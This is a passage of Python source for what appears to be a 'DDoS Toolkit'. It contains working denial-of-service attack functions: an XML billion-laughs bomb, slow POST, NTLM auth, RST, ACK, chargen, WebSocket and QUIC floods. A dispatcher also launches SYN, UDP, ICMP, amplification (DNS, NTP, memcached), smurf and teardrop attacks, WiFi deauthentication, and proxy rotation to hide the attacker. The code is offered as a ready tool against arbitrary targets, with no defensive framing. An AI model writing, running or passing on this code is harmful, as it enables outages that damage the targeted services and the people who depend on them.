                            requests_sent += 1
                            if response.status in [200, 201, 204]:
                                successful_requests += 1
                            else:
                                failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during slow POST attack: {e}")
                await asyncio.sleep(pause_time)

async def xml_bomb_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
    """XML Bomb (Billion Laughs) attack."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    xml_bomb = """<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/xml",
        "Accept": "application/xml"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.post(
                        target_url,
                        headers=headers,
                        proxy=proxy,
                        data=xml_bomb,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        with requests_lock:
                            requests_sent += 1
                            if response.status in [200, 201, 204]:
                                successful_requests += 1
                            else:
                                failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during XML bomb attack: {e}")
                await asyncio.sleep(pause_time)

async def ntlm_auth_flood(target_url, stop_event, pause_time, rate_limit, proxies=None):
    """NTLM authentication flood attack."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==",
        "Connection": "keep-alive"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.get(
                        target_url,
                        headers=headers,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as response:
                        with requests_lock:
                            requests_sent += 1
                            if response.status == 401:
                                successful_requests += 1
                            else:
                                failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during NTLM auth flood: {e}")
                await asyncio.sleep(pause_time)

def char_gen_flood(target_ip, target_port, duration):
    """Character generator protocol flood attack."""
    print(f"Starting CHAR-GEN flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(b"\x01", (target_ip, target_port))
        except Exception as e:
            logger.error(f"Error during CHAR-GEN flood: {e}")
        time.sleep(0.01)
    print("CHAR-GEN flood attack completed.")

def rst_flood(target_ip, target_port, duration):
    """TCP RST flood attack."""
    print(f"Starting RST flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(dst=target_ip) / \
                     scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="R")
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during RST flood: {e}")
        time.sleep(0.01)
    print("RST flood attack completed.")

def ack_flood(target_ip, target_port, duration):
    """TCP ACK flood attack."""
    print(f"Starting ACK flood attack on {target_ip}:{target_port} for {duration} seconds...")
    start_time = time.time()
    while time.time() - start_time < duration and not stop_event.is_set():
        try:
            packet = scapy.IP(dst=target_ip) / \
                     scapy.TCP(sport=random.randint(1024, 65535), dport=target_port, flags="A")
            scapy.send(packet, verbose=False)
        except Exception as e:
            logger.error(f"Error during ACK flood: {e}")
        time.sleep(0.01)
    print("ACK flood attack completed.")

async def http_fragmentation_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
    """HTTP packet fragmentation attack."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("http://", "https://")):
        target_url = f"http://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "keep-alive"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    # Send partial headers first
                    connector = aiohttp.TCPConnector(force_close=True)
                    async with aiohttp.ClientSession(connector=connector) as partial_session:
                        async with partial_session.get(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during HTTP fragmentation attack: {e}")
                await asyncio.sleep(pause_time)

async def ws_dos_attack(target_url, stop_event, pause_time, rate_limit, proxies=None):
    """WebSocket denial of service attack."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("ws://", "wss://", "http://", "https://")):
        target_url = f"ws://{target_url}"

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    async with session.ws_connect(
                        target_url,
                        proxy=proxy,
                        timeout=aiohttp.ClientTimeout(total=10)
                    ) as ws:
                        # Send large amounts of data or keep connection open
                        for i in range(1000):
                            await ws.send_str("A" * 1024)
                            await asyncio.sleep(0.1)
                        with requests_lock:
                            requests_sent += 1
                            successful_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during WebSocket DoS: {e}")
                await asyncio.sleep(pause_time)

async def quic_flood(target_url, stop_event, pause_time, rate_limit, proxies=None):
    """QUIC protocol flood attack."""
    global requests_sent, successful_requests, failed_requests
    proxy_pool = cycle(proxies) if proxies else None
    semaphore = asyncio.Semaphore(rate_limit)

    if not target_url.startswith(("https://")):
        target_url = f"https://{target_url}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "*/*",
        "Connection": "keep-alive"
    }

    async with aiohttp.ClientSession() as session:
        while not stop_event.is_set():
            async with semaphore:
                try:
                    proxy = next(proxy_pool) if proxy_pool else None
                    # Force QUIC by using HTTP/3
                    connector = aiohttp.TCPConnector(force_close=True, enable_cleanup_closed=True)
                    async with aiohttp.ClientSession(connector=connector) as quic_session:
                        async with quic_session.get(
                            target_url,
                            headers=headers,
                            proxy=proxy,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as response:
                            with requests_lock:
                                requests_sent += 1
                                if response.status in [200, 201, 204]:
                                    successful_requests += 1
                                else:
                                    failed_requests += 1
                except Exception as e:
                    with requests_lock:
                        failed_requests += 1
                    logger.error(f"Error during QUIC flood: {e}")
                await asyncio.sleep(pause_time)

def display_status(stop_event: threading.Event, duration: int, results_file=None):
    """Display real-time attack statistics and save results."""
    start_time = time.time()
    results = []
    with tqdm(total=duration, desc="Progress") as pbar:
        while not stop_event.is_set():
            elapsed = time.time() - start_time
            if elapsed >= duration:
                break
            with requests_lock:
                current_time = time.time()
                rps = requests_sent / max(1, current_time - start_time)
                rps_history.append(rps)
                stats = {
                    "Time": elapsed,
                    "Requests Sent": requests_sent,
                    "Successful Requests": successful_requests,
                    "Failed Requests": failed_requests,
                    "RPS": rps,
                    "CPU Usage": psutil.cpu_percent(),
                    "Memory Usage": psutil.virtual_memory().percent,
                    "Network Usage": psutil.net_io_counters().bytes_sent + psutil.net_io_counters().bytes_recv,
                }
                results.append(stats)
                print(f"{GREEN}Requests Sent: {requests_sent} | Successful: {successful_requests} | Failed: {failed_requests} | RPS: {rps:.2f} | CPU: {stats['CPU Usage']}% | Memory: {stats['Memory Usage']}% | Network: {stats['Network Usage']} bytes{RESET}")
            pbar.update(1)
            time.sleep(1)

    if results_file:
        with open(results_file, "w") as f:
            json.dump(results, f, indent=4)
        print(f"Results saved to {results_file}")

def simple_status(attack_name: str, target: str, duration: int):
    """Display simple status for non-HTTP attacks."""
    print(f"{GREEN}Starting {attack_name} on {target} for {duration} seconds...{RESET}")
    start_time = time.time()
    while time.time() - start_time < duration and not stop_event.is_set():
        time.sleep(1)
    print(f"{GREEN}{attack_name} completed.{RESET}")

def calculate_rps_stats():
    """Calculate requests-per-second statistics."""
    if not rps_history:
        return {"min": 0, "max": 0, "avg": 0}
    return {
        "min": min(rps_history),
        "max": max(rps_history),
        "avg": sum(rps_history) / len(rps_history),
    }

def signal_handler(sig, frame):
    """Handle interrupt signals for graceful shutdown."""
    global stop_event
    logging.info(f"{RED}\nInterrupted by user. Exiting gracefully...{RESET}")
    stop_event.set()
    sys.exit(0)

async def main():
    """Main function to coordinate attack execution."""
    args = parse_args()

    if args.help or len(sys.argv) == 1:
        display_help()
        sys.exit(0)

    if args.version:
        print(f"DDoS Toolkit version 1.0#Stable | Platform: x86_64-pc-linux-gnu | License: MIT")
        sys.exit(0)

    display_banner()

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if args.interactive:
        print(f"{YELLOW}Interactive mode not yet implemented. Using command-line arguments.{RESET}")

    if args.threads <= 0 or args.pause <= 0 or args.duration <= 0 or args.rate_limit <= 0:
        print(f"{RED}Error: Invalid argument values. Ensure all values are positive.{RESET}")
        exit(1)

    proxies = load_proxies(args.proxies) if args.proxies else []
    if proxies:
        proxies = validate_proxies(proxies)
        asyncio.create_task(monitor_proxy_health(proxies))

    target = args.url.split("//")[-1].split("/")[0] if args.url else None

    if args.scan and target:
        target_ip = await resolve_target(target)
        if target_ip:
            run_network_scanner(target_ip)
        else:
            print(f"{RED}Exiting: Target is not reachable.{RESET}")
        exit(0)

    if args.wifi_deauth:
        wifi_deauth("wlan0")
        exit(0)

    if args.anonymizer:
        run_anonymizer(args.anonymizer)
        exit(0)

    if not args.url and not args.interactive:
        print(f"{RED}Error: Target URL is required for attack modes.{RESET}")
        display_help()
        exit(1)

    stop_event = threading.Event()
    tasks = []

    # Determine if we should use detailed status or simple status
    use_detailed_status = args.attack_mode in ["http-flood", "slowloris", "http2-flood", 
                                             "slow-post", "xml-bomb", "ntlm-auth-flood",
                                             "http-fragmentation", "ws-dos", "quic-flood"]

    # Attack mode selection
    if args.attack_mode == "char-gen":
        target_ip = await resolve_target(target)
        target_port = 19  # Default port for char-gen
        threading.Thread(target=char_gen_flood, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("CHAR-GEN flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "rst-flood":
        target_ip = await resolve_target(target)
        target_port = 80  # Default port for RST flood
        threading.Thread(target=rst_flood, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("RST flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ack-flood":
        target_ip = await resolve_target(target)
        target_port = 80  # Default port for ACK flood
        threading.Thread(target=ack_flood, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("ACK flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "http-fragmentation":
        for _ in range(args.threads):
            task = asyncio.create_task(http_fragmentation_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "ws-dos":
        for _ in range(args.threads):
            task = asyncio.create_task(ws_dos_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "quic-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(quic_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "land-attack":
        target_ip = await resolve_target(target)
        target_port = 80
        threading.Thread(target=land_attack, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("LAND attack", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ping-of-death":
        target_ip = await resolve_target(target)
        threading.Thread(target=ping_of_death, args=(target_ip, args.duration)).start()
        threading.Thread(target=simple_status, args=("Ping of Death", target_ip, args.duration)).start()
    elif args.attack_mode == "slow-post":
        for _ in range(args.threads):
            task = asyncio.create_task(slow_post_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "xml-bomb":
        for _ in range(args.threads):
            task = asyncio.create_task(xml_bomb_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "ntlm-auth-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(ntlm_auth_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "syn-flood":
        target_ip = await resolve_target(target)
        target_port = 80
        threading.Thread(target=syn_flood, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("SYN flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "http-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(rate_limited_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "slowloris":
        for _ in range(args.threads):
            task = asyncio.create_task(slowloris_attack(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()
    elif args.attack_mode == "udp-flood":
        target_ip = await resolve_target(target)
        target_port = 80
        threading.Thread(target=udp_flood, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("UDP flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "icmp-flood":
        target_ip = await resolve_target(target)
        threading.Thread(target=icmp_flood, args=(target_ip, args.duration)).start()
        threading.Thread(target=simple_status, args=("ICMP flood", target_ip, args.duration)).start()
    elif args.attack_mode == "dns-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=dns_amplification, args=(target_ip, args.duration)).start()
        threading.Thread(target=simple_status, args=("DNS amplification", target_ip, args.duration)).start()
    elif args.attack_mode == "ftp-flood":
        target_ip = await resolve_target(target)
        target_port = 21  # Default FTP port
        threading.Thread(target=ftp_flood, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("FTP flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ssh-flood":
        target_ip = await resolve_target(target)
        target_port = 22  # Default SSH port
        threading.Thread(target=ssh_flood, args=(target_ip, target_port, args.duration)).start()
        threading.Thread(target=simple_status, args=("SSH flood", f"{target_ip}:{target_port}", args.duration)).start()
    elif args.attack_mode == "ntp-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=ntp_amplification, args=(target_ip, args.duration)).start()
        threading.Thread(target=simple_status, args=("NTP amplification", target_ip, args.duration)).start()
    elif args.attack_mode == "memcached-amplification":
        target_ip = await resolve_target(target)
        threading.Thread(target=memcached_amplification, args=(target_ip, args.duration)).start()
        threading.Thread(target=simple_status, args=("Memcached amplification", target_ip, args.duration)).start()
    elif args.attack_mode == "smurf":
        target_ip = await resolve_target(target)
        threading.Thread(target=smurf_attack, args=(target_ip, args.duration)).start()
        threading.Thread(target=simple_status, args=("Smurf attack", target_ip, args.duration)).start()
    elif args.attack_mode == "teardrop":
        target_ip = await resolve_target(target)
        threading.Thread(target=teardrop_attack, args=(target_ip, args.duration)).start()
        threading.Thread(target=simple_status, args=("Teardrop attack", target_ip, args.duration)).start()
    elif args.attack_mode == "http2-flood":
        for _ in range(args.threads):
            task = asyncio.create_task(http2_flood(args.url, stop_event, args.pause, args.rate_limit, proxies))
            tasks.append(task)
        threading.Thread(target=display_status, args=(stop_event, args.duration, args.results)).start()

    await asyncio.sleep(args.duration)
    stop_event.set()

    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)

    if use_detailed_status:
        stats = calculate_rps_stats()
        print(f"\n{GREEN}Attack completed! RPS Stats: Min={stats['min']:.2f}, Max={stats['max']:.2f}, Avg={stats['avg']:.2f}{RESET}")

    if args.results:
        print(f"{GREEN}Results saved to {args.results}{RESET}")

    if args.anonymizer == "start":
        print(f"{BLUE}[INFO] Stopping anonymizer...{RESET}")
        run_anonymizer("stop")

if __name__ == "__main__":
    asyncio.run(main())
